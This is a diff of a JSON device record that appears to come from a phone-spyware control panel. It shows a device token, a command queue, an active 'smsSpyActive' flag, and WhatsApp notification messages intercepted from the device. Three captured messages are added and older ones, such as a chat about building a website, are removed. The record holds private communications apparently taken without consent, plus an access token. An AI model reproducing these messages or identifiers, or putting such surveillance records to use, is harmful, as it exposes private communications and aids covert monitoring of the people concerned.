@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776908122065,
+    "lastSeen": 1776908127916,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "BEW STORE",
+        "content": "bantuin keluar dulu sayang",
+        "time": "23/04 09:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908128526
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 40 chat",
+        "time": "23/04 09:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908128195
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "BEW STORE",
+        "content": "bantuin keluar dulu sayang",
+        "time": "23/04 09:35",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776908122953
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "22/04 19:14",
         "pkg": "com.whatsapp",
         "receivedAt": 1776856495029
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "boleh kak, untuk web ecommerce seperti ini saya bantu buatkan previewnya ya",
-        "time": "22/04 19:14",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776856493865
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Khifrandev Solution",
-        "content": "Halo kak, boleh untuk website apa kak?",
-        "time": "22/04 19:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776856234188
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎57 pesan dari 36 chat",
-        "time": "22/04 19:10",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776856234074
       }
     ],
     "galleryPhotos": [],
